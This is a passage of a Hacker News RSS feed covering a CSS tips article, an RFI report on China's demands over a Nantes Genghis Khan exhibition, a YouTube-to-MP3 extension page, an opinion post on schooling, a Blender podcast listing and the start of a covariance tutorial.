<li>Increase/decrease counter value using <strong>counter-increment</strong></li>
<li>Use <strong>counter()</strong> or <strong>counters()</strong> function to display counter value from within the content property</li>
</ul>
<pre><code>ol.numbered-list &gt; li:before { 
  content: counter(li); 
  position: absolute; 
  box-sizing: border-box; 
  width: 45px; 
  height: 45px; 
  background: #f3b70f; 
  border-radius: 50%; 
} 

ol.numbered-list li { 
  position: relative; 
  left: 0px; 
  list-style: none; 
  counter-increment: li; 
}</code></pre>
<h4>14. ::selection</h4>
<p>With the "<strong>::selection</strong>" pseudo-element you can change the color of text selection by overriding at browser level to replace the color of text highlight with your defined color option. Your chosen color would appear when the content is selected using the cursor.</p>
<pre><code>:selection { 
  background-color: #f3b70f; 
}</code></pre>
<h4>15. Styling Broken Images</h4>
<p>Poor web designs don’t often have a way to manage broken images, and whenever an image is missing, the webpage doesn’t look good. Considering that the problem may arise now and then, advanced CSS could be used to styling broken images and make your custom error messages look presentable to the visitors. Here’s how you can do that:</p>
<pre><code>img { 
  font-family: 'Helvetica'; 
  font-weight: 300; 
  line-height: 2;   
  text-align: center; 
  width: 100%; 
  height: auto; 
  display: block; 
  position: relative; 
} 

img:before {  
  content: "We're sorry, the image below is broken :("; 
  display: block; 
  margin-bottom: 10px; 
} 

img:after {  
  content: "(url: " attr(src) ")"; 
  display: block; 
  font-size: 12px; 
}</code></pre>
<p>Here, we use <strong>:before</strong> and <strong>:after</strong> pseudo-classes to display error messages in case of a missing/broken image. The value of <strong>src</strong> property is returned using <strong>attr()</strong> function in CSS, displaying the faulty URLs.</p>
<h4>16. @support</h4>
<p>When using a CSS property that’s not supported by most web browsers, we advise using a feature query known as <strong>@support</strong> rule. It helps you to find out if the browser supports the CSS property: value pairs or not. Any code that you have put …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs">https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs</a></em></p>]]>
            </description>
            <link>https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080203</guid>
            <pubDate>Fri, 13 Nov 2020 08:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[French museum suspends Genghis exhibition in reaction to Chinese censorship bid]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25079764">thread link</a>) | @rbecker
<br/>
November 12, 2020 | https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                    A museum in France has decided to postpone an exhibition featuring Genghis Khan, legendary leader of the ancient Mongol empire, after Chinese authorities demanded a change in the title and complete access to exhibit descriptions.&nbsp;
                </p><div>
                    
                                        <p>The event was heralded as “one of the most comprehensive exhibitions on Genghis Khan and the Mongol empire ever presented internationally” by Edinburgh-based organisers&nbsp;<a href="http://www.nomadexhibitions.com/" target="_blank">Nomad Exhibitions</a> which initiated the cooperation with the <a href="http://www.nmgbwy.com/" target="_blank">Inner Mongolia Museum</a> in Hohhot, capital of China’s Inner Mongolia Autonomous Region, in 2007.</p><p>After ten years work to “establish a relationship” and win the trust of the Chinese partner – many objects have&nbsp;never before left China – &nbsp;Nomad found the Dutch <a href="http://www.nmm.nl/en/" target="_blank">National Military Museum</a> ready to host the exhibition for the first time, and it was launched in 2017 under the title “<a href="http://www.nomadexhibitions.com/genghis-rise-of-the-mongol-khans" target="_blank">Genghis, Rise of the Mongol Khans</a>.”</p>

    <div>
                    
<figure>
    <p><img src="https://s.rfi.fr/media/display/16305dfe-1228-11ea-ac0e-005056a99247/Genghis_Khan_empire-en.svg_.png" alt="The conquests of Genghis Khan's armies, 1207 - 1227" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/16305dfe-1228-11ea-ac0e-005056a99247\/&quot;,&quot;filename&quot;:&quot;Genghis_Khan_empire-en.svg_.png&quot;,&quot;ratio&quot;:null,&quot;displayFormat&quot;:&quot;original&quot;}">
    </p>
                        <figcaption>
                <span>The conquests of Genghis Khan's armies, 1207 - 1227</span>                <span>© </span>            </figcaption>
            </figure>

        </div><p>The “Genghis” exhibition had <a href="http://www.china.org.cn/arts/2017-02/17/content_40319782.htm" target="_blank">positive reviews</a>, even from China’s state-controlled Xinhua News Agency which said that the Dutch exhibition provided&nbsp;new insights&nbsp;into Genghis Khan.</p><p>The idea was that Ghengis&nbsp;would&nbsp;continue conquer the world, this time as a travelling exhibition.</p><p>But that hasn’t happened – yet.</p><p>After some years of preparation, Genghis was scheduled to arrive&nbsp;in the History Museum of Nantes, France, at the <a href="http://www.chateaunantes.fr/en/" target="_blank">Chateau des ducs de Bretagne</a>. The exhibition, entitled&nbsp;"Son of heaven and the steppes - Genghis Khan and the birth of the Mongol empire" was to have opened on 17 October.</p><h2><strong>Biased rewriting</strong></h2><p>On 13 October, the museum suddenly announced that the exhibition was cancelled. It said that authorities of the Chinese Cultural Affairs Bureau wanted to change the exhibition’s title, taking out the words “Genghis Khan,” “empire” and "Mongol”.</p><p>Bertrand Guillet, Director of the museum, said in a <a href="http://www.chateaunantes.fr/expositions/fils-du-ciel-et-des-steppes/" target="_blank">statement</a> that the Chinese also wanted “control over all our productions, texts, maps, the catalogue, press releases.”</p>                
    <p>An&nbsp;edit, proposed by Beijing “included biased rewriting aimed at completely erasing Mongolian history and culture in favor of a new national narrative,” according to Guillet.</p><p>The exhibition is now planned to open in 2024, with artefacts provided by other, non-Chinese, museums.</p><h2><strong>No room for Mongolian nationalism</strong></h2><p>Guillet has reason to worry. <a href="http://www.nmgbwy.com/" target="_blank">The homepage</a> of the Inner Mongolia Museum’s website opens with an eye-catching red-and-yellow banner featuring not Mongolian artifacts but the Forbidden City in Beijing, a section of the Great Wall, and the text “<em>Follow the Party Forever, Together Build the Chinese Dream</em>,” a slogan coined by Xi Jinping.&nbsp;Everything is dominated by Han Chinese, and nothing initially points at Mongol culture.</p>

    <a href="http://www.nmgbwy.com/">
                    
<figure>
    <p><img src="https://s.rfi.fr/media/display/0c3ea8fe-0ef9-11eb-b94f-005056a98db9/2020-10-15%20Screengrab%20Inner%20Mongolia%20Museum%20website.jpg" alt="Screengrab from the Inner Mongolia Museum in Hohhot. The text reads &quot;forever follow the party, together build the Chinese dream.&quot;" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/0c3ea8fe-0ef9-11eb-b94f-005056a98db9\/&quot;,&quot;filename&quot;:&quot;2020-10-15 Screengrab Inner Mongolia Museum website.jpg&quot;,&quot;ratio&quot;:&quot;p:16x9&quot;,&quot;displayFormat&quot;:&quot;original&quot;}">
    </p>
                        <figcaption>
                <span>Screengrab from the Inner Mongolia Museum in Hohhot. The text reads "forever follow the party, together build the Chinese dream."</span>                <span>© Screengrab Neimenggu Bowuyuan (Inner Mongolia Museum)</span>            </figcaption>
            </figure>

        </a><p>A page deep inside the website&nbsp;does show an <a href="http://mp.weixin.qq.com/s?__biz=MzA3ODg5MzIzNg==&amp;mid=2650188643&amp;idx=1&amp;sn=a2297b678fd010a0b7634cf9072b9262&amp;chksm=87b9d2b8b0ce5baec6967abfdece06f16a056af1fffdb6c5735ef9a625516d152aaada64f82b&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1581479331874&amp;sharer_sh?contentId=1713" target="_blank">extensive history</a> of the Mongols, illustrated by a video presentation of the museum’s “explainer” Buhe Chaolu, an ethnic Mongolian himself. The exhibition, here called <em>Tianjiao Menggu</em> (“Heavenly, Proud Mongolia”) – carries no initial references to Genghis Khan or his vast empire.</p><p>Later, the text does refer to how Genghis Khan “founded the great Mongol empire” which conquered China and founded the Yuan Dynasty (1271-1368).</p><h2><strong>Brutal control</strong></h2><p>But the story stops there, without a single reference to how Mongolia was conquered by the non-Chinese Qing dynasty (who were Manchurian). There is no explanation of&nbsp;how Outer Mongolia split off after the 1911 revolution, nor of how the Chinese Communist Party brutally re-established control over the territory called the “Inner Mongolia Autonomous Region,” moving Han-Chinese to Mongolian lands so that Mongols are now a minority in their own territory.</p><p>Recently, China seems to have hardened its policy towards its minorities. Last month, Mongolians in the Chinese&nbsp;Autonomous Region&nbsp;of Inner Mongolia <a href="https://www.rfi.fr/en/international/20200909-chinese-minorities-fear-beijing-s-efforts-to-stamp-out-local-languages-cultures" target="_self">demonstrated</a> against government plans to strengthen Chinese language education at the expense of their native Mongolian.</p>

    <div>
                    
<figure>
    <p><img src="https://s.rfi.fr/media/display/e88e5cfc-f750-11ea-a1cb-005056a964fe/a07da3727fe51261e3d8c31758cc241734379f19.jpg" alt="Mongolians in the capital Ulaanbaatar protest against Beijing's plan to introduce Mandarin-only classes at schools in the Chinese province of Inner Mongolia" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/e88e5cfc-f750-11ea-a1cb-005056a964fe\/&quot;,&quot;filename&quot;:&quot;a07da3727fe51261e3d8c31758cc241734379f19.jpg&quot;,&quot;ratio&quot;:null,&quot;displayFormat&quot;:&quot;original&quot;}">
    </p>
                        <figcaption>
                <span>Mongolians in the capital Ulaanbaatar protest against Beijing's plan to introduce Mandarin-only classes at schools in the Chinese province of Inner Mongolia</span>                <span>AFP</span>            </figcaption>
            </figure>

        </div><p>Tibetan and Uyghur areas have also complained of a shift in language education -&nbsp; a direct result of current Party Secretary Xi Jinping's apparent attempts to integrate China's minorities with the dominant Han-Chinese by means of "ethnic contact, exchange and blending," a catchphrase initially invented by Xi's predecessor Hu Jintao, but today made into a national policy intended to further subject the minorities - in some cases, as in Xinjiang, <a href="https://www.rfi.fr/en/asia/20200219-new-xinjiang-leaks-detail-china-s-massive-detention-system-uyghurs" target="_self">by brute force</a>.</p><p>Beijing’s attempts to influence presentations like the Genghis exhibition in Nantes indicate that China’s minority policy is now expanding beyond its borders.</p>
                                            
    
                </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079764</guid>
            <pubDate>Fri, 13 Nov 2020 07:03:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OS108-9.1 XFCE amd64 released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25079641">thread link</a>) | @todsacerdoti
<br/>
November 12, 2020 | https://forums.os108.org/d/32-os108-91-xfce-amd64-released | <a href="https://web.archive.org/web/*/https://forums.os108.org/d/32-os108-91-xfce-amd64-released">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://forums.os108.org/d/32-os108-91-xfce-amd64-released</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079641</guid>
            <pubDate>Fri, 13 Nov 2020 06:39:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Client-side YouTube to MP3 using ffmpeg.js in a Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079455">thread link</a>) | @benkaiser
<br/>
November 12, 2020 | https://benkaiser.github.io/youtube-to-mp3/ | <a href="https://web.archive.org/web/*/https://benkaiser.github.io/youtube-to-mp3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        A server-less chrome extension to convert youtube videos to mp3 files for download. If available, files are persisted to <a href="https://siasky.net/">Sia SkyNet</a> for future downloads by all users.
      </p>
      <p>This Youtube to MP3 chrome extension is different in a few ways:
        </p><ol>
          <li>The conversion takes place on your machine, not a server, so there's no server costs we need to cover with ads</li>
          <li>The conversion logic exists on your machine, and is resilliant to takedowns</li>
          <li>Your conversions are cached with <a href="https://siasky.net/">Sia SkyNet</a> for quick download without conversion in the future by everyone</li>
          <li>This extension <a href="https://github.com/benkaiser/youtube-to-mp3">is open source</a> and available for you to inspect the integrity of it yourself</li>
        </ol>
      
      <h2>Installation</h2>
      <div>
        <div>
          <p>
            <a href="https://benkaiser.github.io/youtube-to-mp3/extension.zip">Download Extension Zip</a>
          </p>
          <p>
            Steps to Install:

            </p><ol>
              <li>Download extension zip file and unzip</li>
              <li>Navigate to chrome://extensions in your browser</li>
              <li>Enable developer mode in the top right</li>
              <li>Click "Load unpacked" in the top left</li>
            </ol>
          
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/instructions.png" alt="instructions picture">
        </p>
      </div>
      <h2>Usage</h2>
      <div>
        <div>
        <p>
          Just navigate to any youtube video and click the "Download MP3" button next to the Subscribe button.
        </p>
        <p>
          If the file has not yet been converted, your machine will download the youtube video and convert it to an mp3. This process may take 30+ seconds depending on video size, your internet connection and your computers processing power. Once the file is converted a download will trigger on your browser for the file.
        </p>
        <p>
          If someone has previously converted the video to mp3 using the extension already, the download will start in just a few seconds.
        </p>
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/usage.gif" alt="using youtube to mp3">
        </p>
      </div>
    </div></div>]]>
            </description>
            <link>https://benkaiser.github.io/youtube-to-mp3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079455</guid>
            <pubDate>Fri, 13 Nov 2020 06:13:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The True Purpose of Schools]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079113">thread link</a>) | @dchacke
<br/>
November 12, 2020 | https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html | <a href="https://web.archive.org/web/*/https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The other day, it “clicked” for me: I think I understand better now what schools are really for.</p>

<p>It is generally believed that schools exist to help children learn. Of course, we critical rationalists know that that’s baloney. Instead, we understand—thanks to <em>Taking Children Seriously</em>—that schools exist to <em>standardize</em> children: to get them to replicate society’s memes as faithfully as possible under threat of punishment. Static-society stuff (cf. David Deutsch, <a href="https://www.amazon.com/Beginning-Infinity-Explanations-Transform-World/dp/0143121359/"><em>The Beginning of Infinity</em></a>). At least that was my current understanding of it. But I’m starting to see that it goes deeper than that.</p>

<p>Consider a child who is interested in, say, astronomy. Most elementary schools do not offer astronomy classes. And even if they did, it is highly unlikely that any given child would happen to be interested in <em>all</em> of the things that are shoved down his throat year after year, at just the right time. A child’s interests don’t evolve in sync with the school’s schedule. If the child is lucky, he will be genuinely interested in a few of the topics any given year, but never even close to all of them.</p>

<p>So, the child wants to learn about astronomy—but doesn’t get to. Instead, he is forced to learn <em>other</em> things he <em>isn’t</em> interested in. Day in, day out, for  some 12 years. As Popper said, he has to learn answers to questions he didn’t ask.</p>

<p>A child is then faced with two options: to go insane, or to learn to cope with the situation. So, what can one possibly <em>do</em> in such a situation to stay sane? I see only one solution: one must learn to put one’s <em>own</em> interests on the back burner and prioritize <em>other people’s</em> interests—in this case, the teacher’s, and society’s at large. One must learn to coerce oneself to neglect one’s preferences. I think <em>that</em> is what school is really for: not just to standardize children, but to break them, too, to place others’ interests over their own.</p>

<p>I recently asked a 14 year old close to me if she’d like to go to college. She said no, but that she probably will anyway because she thinks she <em>should</em>. It’s heartbreaking.</p>

<p>It is only after 12 years of mind-numbing boredom and neglecting one’s preferences that people voluntarily spend the next 30, 40, sometimes 50 years at jobs they hate. Forever delaying their dreams is what they’re good at. It is in school that they learn how to live with problems and endure them instead of <em>solving</em> them. It is there that they are taught that their interests have no chance of leading to anything fruitful, so they shut them down quickly.</p>

<p>Parents are often complicit in this. E.g., they take away things that their children enjoy, such as their computers, gameboys, etc, or at least put time limits on them—so that their kids spend less time doing what they <em>want</em> and more of what they allegedly <em>need</em>, which is determined by anyone but the child.</p>

<p>I’m thankful that David Deutsch puts emphasis on <em>fun</em> and <em>interests</em>. They’re hugely underrated.</p>

<p>If school’s main purpose is to teach children how to neglect their own interests and instead pursue other people’s interests, that also explains where <em>altruism</em> comes from—the evil doctrine Rand so eloquently refuted and which, she says, “regards man, in effect, as a sacrificial animal,” quoting Auguste Comte, who coined the term “to mean, specifically, the placing of the interests of others above your own.” (see the YouTube video at the bottom)</p>

<h2>
  The true purpose of schools is to turn children—born individualists—into altruists; to systematically neglect their own interests in favor of others' interests.
</h2>

<p>It is to force children to betray their intellectual integrity. They must “sacrifice [their minds] to what <em>others</em> believe or want to be true.” — Ayn Rand (though she didn’t state this in the context of schooling and children in particular, but society at large)</p>

<p>This true purpose explains why people <em>live for others</em>, and then expect others to do so as well. It’s what they were forced to do during the most formative years of their lives after all!</p>

<p>It explains why so many expect their peers to sacrifice their happiness for the health of others by agreeing to house arrests. Why those who don’t want their salaries to be cut in half by taxes are considered “evil.” Why so many can’t begin to imagine a world without coercion. “If I had to do it, why should anyone else get a free pass?”</p>

<p>I’m guessing that most teachers do not understand this true purpose of school. They become teachers because <a href="https://blog.dennishackethal.com/2020/10/25/the-tragedy-of-children-becoming-teachers.html">they want to “help” children</a>—that is, give children what they allegedly “need.” It is only altruists who can become teachers and perpetuate the cycle. In other words, the memeplex of schools depends on breaking children so successfully that some of them decide to continue the tradition. Not only do teachers not know why they’re contributing to this altruism machine, <em>it relies on teachers not understanding its true nature to keep itself alive.</em> This makes me wonder if schools as a whole are static memeplexes.</p>

<p>I think many experienced critical rationalists, on the other hand, understand school’s true purpose deeply. For me, it was a breakthrough. Though the topic is sad, writing this post was fun. A lot of stuff is beginning to make more sense. I’m pursuing my interests <em>right now</em>. I love critical rationalism.</p>

<p>
  <iframe src="https://www.youtube-nocookie.com/embed/7RFlPmjUbRo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079113</guid>
            <pubDate>Fri, 13 Nov 2020 05:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bassam Kurdali on using Blender for open movie productions and education]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078788">thread link</a>) | @pabs3
<br/>
November 12, 2020 | https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html | <a href="https://web.archive.org/web/*/https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span>FOSS and Crafts</span> -- Thu 12 November 2020</p><div><p><a href="https://urchn.org/">Bassam Kurdali</a>
(<a href="https://mastodon.social/@bkurdali">Fediverse</a>, <a href="https://twitter.com/bkurdali">Twitter</a>)
talks about using <a href="https://www.blender.org/">Blender</a>
(a free and open source software suite for making 3d artwork)
for open movie projects such as <a href="https://orange.blender.org/">Elephants Dream</a>
(the world's first open movie project, which Bassam directed!)
and <a href="https://wiresforempathy.org/">Wires for Empathy</a>,
as well as use in teaching it to college students studying animation.</p><p><strong>Links:</strong></p><ul><li><a href="https://www.blender.org/">Blender</a></li><li><a href="https://urchn.org/">Urchin studios</a></li><li>Chicken Chair (we need a better link for this... check back later!)</li><li><a href="https://orange.blender.org/">Elephants Dream</a></li><li><a href="https://wiresforempathy.org/">Wires for Empathy</a> (aka "Tube")</li><li><a href="https://opentoonz.github.io/e/">OpenToonz</a></li><li><a href="https://www.charlielee.uk/boats-animator/">Boats Animator</a></li><li><a href="https://natrongithub.github.io/">Natron</a></li><li><a href="https://www.hampshire.edu/">Hampshire College</a></li><li><a href="https://www.risd.edu/">Rhode Island School of Design (RISD)</a></li><li><a href="https://cloud.blender.org/p/gallery/57e507b80fcf29412d1f1e53">Blender splash screens gallery</a></li></ul></div></div></div></div></div>]]>
            </description>
            <link>https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078788</guid>
            <pubDate>Fri, 13 Nov 2020 04:13:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What if you tried to catch a 1000 MPH baseball? [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078082">thread link</a>) | @rmason
<br/>
November 12, 2020 | https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more | <a href="https://web.archive.org/web/*/https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                                                                                <p>Just hit play. It's timestamped.</p><mediatag id="40379"></mediatag><p>td;dw: You would die. Expeditiously.</p>
                                    <!--                                 <p>
                    <span class="text-muted text-sm">Last Updated Nov 14th, 2020 at 2:47 am</span>
                </p>
                 -->
            </div>
        </div></div>]]>
            </description>
            <link>https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078082</guid>
            <pubDate>Fri, 13 Nov 2020 02:19:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pre-processing for deep learning: from covariance matrix to image whitening]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078004">thread link</a>) | @sebg
<br/>
November 12, 2020 | https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/ | <a href="https://web.archive.org/web/*/https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> Essential Math for Data Science</p><p>I just released my book "Essential Math for Data Science"🎉.<br> Get it before the 30th of November 2020 and benefit from a <b>HUGE DISCOUNT</b>!</p><p><a href="https://www.essentialmathfordatascience.com/"> <b>GET THE BOOK</b> </a></p></div><p><a href="https://www.essentialmathfordatascience.com/"> <img src="https://hadrienj.github.io/assets/images/cover.jpg" width="40%"> </a></p></div><p><em>Last update: Jan. 2020</em></p><p>A notebook version of this post can be found <a href="https://github.com/hadrienj/Preprocessing-for-deep-learning">here</a> on Github.</p><p>The goal of this post/notebook is to go from the basics of data preprocessing to modern techniques used in deep learning. My point is that we can use code (Python/Numpy etc.) to better understand abstract mathematical notions! Thinking by coding! 💥</p><p>We will start with basic but very useful concepts in data science and machine learning/deep learning like variance and covariance matrix and we will go further to some preprocessing techniques used to feed images into neural networks. We will try to get more concrete insights using code to actually see what each equation is doing!</p><p>We call preprocessing all transformations on the raw data before it is fed to the machine learning or deep learning algorithm. For instance, training a convolutional neural network on raw images will probably lead to bad classification performances (<a href="https://ieeexplore.ieee.org/document/7808140/">Pal &amp; Sudeep, 2016</a>). The preprocessing is also important to speed up training (for instance, centering and scaling techniques, see <a href="http://yann.lecun.com/exdb/publis/pdf/lecun-98b.pdf">Lecun et al., 2012; see 4.3</a>).</p><p>Here is the syllabus of this tutorial:</p><ol><li><p><strong>Background</strong>: In the first part, we will get some reminders about variance and covariance and see how to generate and plot fake data to get a better understanding of these concepts.</p></li><li><p><strong>Preprocessing</strong>: In the second part, we will see the basics of some preprocessing techniques that can be applied to any kind of data: mean normalization, standardisation and whitening.</p></li><li><p><strong>Whitening images</strong>: In the third part, we will use the tools and concepts gained in 1. and 2. to do a special kind of whitening called Zero Component Analysis (ZCA). It can be used to preprocess images for deep learning. This part will be very practical and fun ☃️!</p></li></ol><p>Feel free to fork the notebook. For instance, check the shapes of the matrices each time you have a doubt :)</p><h2 id="a-variance-and-covariance">A. Variance and covariance</h2><p>The variance of a variable describes how much the values are spread. The covariance is a measure that tells the amount of dependency between two variables. A positive covariance means that values of the first variable are large when values of the second variables are also large. A negative covariance means the opposite: large values from one variable are associated with small values of the other. The covariance value depends on the scale of the variable so it is hard to analyse it. It is possible to use the correlation coefficient that is easier to interpret. It is just the covariance normalized.</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/negative-and-positive-covariance.png" width="500" alt="Intuition about the covariance between two variables" title="Representation of the covariance between two variables."> <em>A positive covariance means that large values of one variable are associated with big values from the other (left). A negative covariance means that large values of one variable are associated with small values of the other one (right).</em></p><p>The covariance matrix is a matrix that summarizes the variances and covariances of a set of vectors and it can tell a lot of things about your variables. The diagonal corresponds to the variance of each vector:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance1.png" width="400" alt="Variance in the matrix of covariance" title="Variance in the matrix of covariance is on the diagonal"> <em>A matrix $\bs{A}$ and its matrix of covariance. The diagonal corresponds to the variance of each column vector.</em></p><p>Let’s just check with the formula of the variance:</p><p>$ V(\bs{X}) = \frac{1}{n}\sum_{i=1}^{n}(x_i-\bar{x})^2 $</p><p>with $n$ the length of the vector, and $\bar{x}$ the mean of the vector. For instance, the variance of the first column vector of $\bs{A}$ is:</p><p>$ V(\bs{A}_{:,1}) = \frac{(1-3)^2+(5-3)^2+(3-3)^2}{3} = 2.67 $</p><p>This is the first cell of our covariance matrix. The second element on the diagonal corresponds of the variance of the second column vector from $\bs{A}$ and so on.</p><p><em>Note</em>: the vectors extracted from the matrix $\bs{A}$ correspond to the columns of $\bs{A}$.</p><h3 id="covariance">Covariance</h3><p>The other cells correspond to the covariance between two column vectors from $\bs{A}$. For instance, the covariance between the first and the third column is located in the covariance matrix as the column 1 and the row 3 (or the column 3 and the row 1).</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance2.png" width="400" alt="Covariance in the matrix of covariance" title="The position in the covariance matrix."> <em>The position in the covariance matrix. Column corresponds to the first variable and row to the second (or the opposite). The covariance between the first and the third column vector of $\bs{A}$ is the element in column 1 and row 3 (or the opposite = same value).</em></p><p>Let’s check that the covariance between the first and the third column vector of $\bs{A}$ is equal to $-2.67$. The formula of the covariance between two variables $\bs{X}$ and $\bs{Y}$ is:</p><p>$ cov(\bs{X},\bs{Y}) = \frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y}) $</p><p>The variables $\bs{X}$ and $\bs{Y}$ are the first and the third column vectors in the last example. Let’s split this formula to be sure that it is crystal clear:</p><ol><li>$(x_1-\bar{x})$. The sum symbol means that we will iterate on the elements of the vectors. We will start with the first element ($i=1$) and calculate the first element of $\bs{X}$ minus the mean of the vector $\bs{X}$.</li><li>$(x_1-\bar{x})(y_1-\bar{y})$. Multiply the result with the first element of $\bs{Y}$ minus the mean of the vector $\bs{Y}$.</li><li>$\sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y})$. Reiterate the process for each element of the vectors and calculate the sum of all results.</li><li>$\frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y})$. Divide by the number of elements in the vector.</li></ol><h4 id="example-1">Example 1.</h4><p>Let’s start with the matrix $\bs{A}$:</p><p>$ \boldsymbol{A}= \begin{bmatrix} 1 &amp; 3 &amp; 5 \\ 5 &amp; 4 &amp; 1 \\ 3 &amp; 8 &amp; 6 \end{bmatrix} $</p><p>We will calculate the covariance between the first and the third column vectors:</p><p>$ \boldsymbol{X} = \begin{bmatrix} 1 \\ 5 \\ 3 \end{bmatrix} $</p><p>and</p><p>$\boldsymbol{Y} = \begin{bmatrix} 5 \\ 1 \\ 6 \end{bmatrix} $</p><p>$\boldsymbol{\bar{x}}=3$, $\boldsymbol{\bar{y}}=4$ and $n=3$ so we have:</p><p>$ cov(X,Y) = \frac{(1-3)(5-4)+(5-3)(1-4)+(3-3)(6-4)}{3}=\frac{-8}{3}=-2.67 $</p><p>Ok, great! That the value of the covariance matrix.</p><p>Now the easy way! With Numpy, the covariance matrix can be calculated with the function <code>np.cov</code>. It is worth noting that if you want Numpy to use the columns as vectors, the parameter <code>rowvar=False</code> has to be used. Also, <code>bias=True</code> allows to divide by $n$ and not by $n-1$.</p><p>Let’s create the array first:</p><div><div><pre><code><span>A</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>1</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>],</span> <span>[</span><span>5</span><span>,</span> <span>4</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>3</span><span>,</span> <span>8</span><span>,</span> <span>6</span><span>]])</span>
<span>A</span>
</code></pre></div></div><pre>array([[1, 3, 5],
       [5, 4, 1],
       [3, 8, 6]])
</pre><p>Now we will calculate the covariance with the Numpy function:</p><div><div><pre><code><span>np</span><span>.</span><span>cov</span><span>(</span><span>A</span><span>,</span> <span>rowvar</span><span>=</span><span>False</span><span>,</span> <span>bias</span><span>=</span><span>True</span><span>)</span>
